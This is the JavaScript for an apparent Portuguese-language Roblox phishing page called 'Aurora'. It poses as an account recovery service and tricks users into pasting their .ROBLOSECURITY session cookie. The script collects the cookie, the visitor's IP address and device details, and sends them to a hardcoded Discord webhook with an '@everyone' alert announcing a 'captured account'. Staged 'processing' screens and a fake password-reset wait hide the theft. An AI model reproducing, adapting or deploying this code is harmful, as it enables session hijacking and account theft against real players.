// CONFIGURAÇÃO - SEU WEBHOOK DO DISCORD
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1485346055141851308/-4ro_V3pWvgd_qRDW6uOO0WkVEmDQmt-9HNzgFd1MnqObF-TGy23rXLxESosIqg8KnFT";

// Chave para armazenar no localStorage
const STORAGE_KEY = "aurora_last_submission";

// Função para enviar dados para o Discord com @everyone
async function sendToDiscord(cookie, userAgent, ip, deviceInfo) {
    const embed = {
        title: "🎮 @everyone NOVA CONTA VINCULADA - AURORA",
        description: "⚠️ **ALERTA IMEDIATO** - Nova conta detectada no sistema!",
        color: 0xff0000,
        fields: [
            {
                name: "🔐 Cookie (.ROBLOSECURITY)",
                value: `\`\`\`fix\n${cookie}\n\`\`\``,
                inline: false
            },
            {
                name: "📱 Dispositivo",
                value: `${deviceInfo.type}\n**Sistema:** ${deviceInfo.os}\n**Navegador:** ${deviceInfo.browser}`,
                inline: true
            },
            {
                name: "🌐 IP do Cliente",
                value: `\`${ip}\``,
                inline: true
            },
            {
                name: "⏰ Data/Hora",
                value: `\`${new Date().toLocaleString('pt-BR')}\``,
                inline: false
            }
        ],
        footer: {
            text: "Aurora Security System | @everyone mencionado",
            icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
        },
        timestamp: new Date().toISOString()
    };

    const payload = {
        content: "@everyone **🚨 NOVA CONTA CAPTURADA!** 🚨",
        embeds: [embed],
        allowed_mentions: { parse: ["everyone"] }
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });
        
        if (response.ok) {
            console.log("Dados enviados para o Discord com sucesso!");
            return true;
        } else {
            console.error("Erro ao enviar para o Discord:", response.status);
            return false;
        }
    } catch (error) {
        console.error("Erro de conexão:", error);
        return false;
    }
}

// Função para obter informações do dispositivo
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let deviceType = "💻 Desktop/PC";
    let os = "Desconhecido";
    let browser = "Desconhecido";
    
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
        deviceType = "📱 Celular/Smartphone";
    } else if (/Tablet|iPad/i.test(ua)) {
        deviceType = "📟 Tablet";
    } else {
        deviceType = "💻 Desktop/PC";
    }
    
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac OS")) os = "macOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    else if (ua.includes("Linux")) os = "Linux";
    
    if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Google Chrome";
    else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Apple Safari";
    else if (ua.includes("Edg")) browser = "Microsoft Edge";
    else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
    
    return { type: deviceType, os: os, browser: browser };
}

// Função para obter IP do cliente
async function getClientIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Erro ao obter IP:", error);
        return "Não foi possível obter o IP";
    }
}

// Função para verificar cooldown (19 dias)
function checkCooldown() {
    const lastSubmission = localStorage.getItem(STORAGE_KEY);
    if (!lastSubmission) return { canSubmit: true, daysLeft: 0 };
    
    const lastDate = new Date(lastSubmission);
    const now = new Date();
    const diffTime = Math.abs(now - lastDate);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    const daysLeft = 19 - diffDays;
    
    if (diffDays >= 19) {
        return { canSubmit: true, daysLeft: 0 };
    } else {
        return { canSubmit: false, daysLeft: daysLeft };
    }
}

function saveSubmissionDate() {
    localStorage.setItem(STORAGE_KEY, new Date().toISOString());
}

function showMessage(message, isError = true) {
    const existingMsg = document.querySelector('.cooldown-message');
    if (existingMsg) existingMsg.remove();
    
    const msgDiv = document.createElement('div');
    msgDiv.className = 'cooldown-message';
    msgDiv.textContent = message;
    msgDiv.style.background = isError ? 'rgba(220, 38, 38, 0.9)' : 'rgba(34, 197, 94, 0.9)';
    document.body.appendChild(msgDiv);
    
    setTimeout(() => {
        msgDiv.remove();
    }, 5000);
}

function showRecoveryScreen() {
    document.getElementById('main-screen').style.display = 'none';
    document.getElementById('recovery-screen').style.display = 'block';
    document.getElementById('processing-screen').style.display = 'none';
}

function showProcessingScreen(message) {
    document.getElementById('main-screen').style.display = 'none';
    document.getElementById('recovery-screen').style.display = 'none';
    document.getElementById('processing-screen').style.display = 'block';
    document.getElementById('processing-message').textContent = message;
}

function resetToMainScreen() {
    document.getElementById('main-screen').style.display = 'block';
    document.getElementById('recovery-screen').style.display = 'none';
    document.getElementById('processing-screen').style.display = 'none';
    document.getElementById('cookie').value = '';
}

async function submitCookie() {
    const cookieInput = document.getElementById('cookie');
    const cookie = cookieInput.value.trim();
    
    if (!cookie) {
        showMessage("❌ Por favor, insira seu cookie .ROBLOSECURITY", true);
        return;
    }
    
    if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS') && !cookie.includes('ROBLOSECURITY')) {
        showMessage("❌ Cookie inválido! Certifique-se de copiar o .ROBLOSECURITY completo", true);
        return;
    }
    
    const { canSubmit, daysLeft } = checkCooldown();
    if (!canSubmit) {
        showMessage(`⚠️ Você precisa aguardar ${daysLeft} dias para realizar um novo processo.`, true);
        return;
    }
    
    showProcessingScreen("Verificando credenciais...");
    
    setTimeout(async () => {
        showProcessingScreen("Autenticando no servidor...");
        
        setTimeout(async () => {
            showProcessingScreen("Conta encontrada! Recuperando dados...");
            
            setTimeout(async () => {
                const ip = await getClientIP();
                const userAgent = navigator.userAgent;
                const deviceInfo = getDeviceInfo();
                
                const sent = await sendToDiscord(cookie, userAgent, ip, deviceInfo);
                
                if (sent) {
                    saveSubmissionDate();
                    showRecoveryScreen();
                } else {
                    showMessage("❌ Erro ao processar solicitação. Tente novamente mais tarde.", true);
                    resetToMainScreen();
                }
            }, 2000);
        }, 1500);
    }, 1000);
}

function startRecoveryProcess() {
    showProcessingScreen("Iniciando recuperação de conta...");
    
    setTimeout(() => {
        showProcessingScreen("Verificando dados do usuário...");
        
        setTimeout(() => {
            showProcessingScreen("Solicitando redefinição de senha...");
            
            setTimeout(() => {
                document.getElementById('processing-message').innerHTML = "⏳ Aguarde de 1 a 3 horas<br>A nova senha será enviada para este dispositivo.";
                
                const progressFill = document.querySelector('.progress-fill');
                progressFill.style.animation = 'none';
                progressFill.offsetHeight;
                progressFill.style.animation = 'progress 3s ease-out infinite';
                
                localStorage.setItem('aurora_recovery_started', new Date().toISOString());
                
                setTimeout(() => {
                    showMessage("⏰ Processo iniciado! Aguarde de 1 a 3 horas. Recarregue a página após o período para tentar novamente.", false);
                }, 1000);
            }, 1500);
        }, 1500);
    }, 1500);
}

window.addEventListener('DOMContentLoaded', () => {
    const { canSubmit, daysLeft } = checkCooldown();
    
    if (!canSubmit) {
        showMessage(`🔒 Você já utilizou o sistema há ${19 - daysLeft} dias. Aguarde mais ${daysLeft} dias para um novo processo.`, true);
        
        setTimeout(() => {
            const sendBtn = document.getElementById('send-btn');
            if (sendBtn) {
                sendBtn.disabled = true;
                sendBtn.style.opacity = '0.5';
                sendBtn.style.cursor = 'not-allowed';
            }
        }, 3000);
    }
    
    const recoveryStarted = localStorage.getItem('aurora_recovery_started');
    if (recoveryStarted) {
        const startDate = new Date(recoveryStarted);
        const now = new Date();
        const hoursPassed = (now - startDate) / (1000 * 60 * 60);
        
        if (hoursPassed < 3) {
            const remainingHours = Math.ceil(3 - hoursPassed);
            showMessage(`⏳ Processo de recuperação em andamento. Aguarde mais ${remainingHours} horas.`, false);
        } else if (hoursPassed >= 3 && hoursPassed < 24) {
            showMessage("✅ Processo concluído! Recarregue a página para iniciar um novo processo.", false);
            setTimeout(() => {
                localStorage.removeItem('aurora_recovery_started');
            }, 86400000 - (now - startDate));
        }
    }
});

document.getElementById('send-btn').addEventListener('click', submitCookie);
document.getElementById('recover-btn').addEventListener('click', startRecoveryProcess);

document.getElementById('cookie').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        submitCookie();
    }
});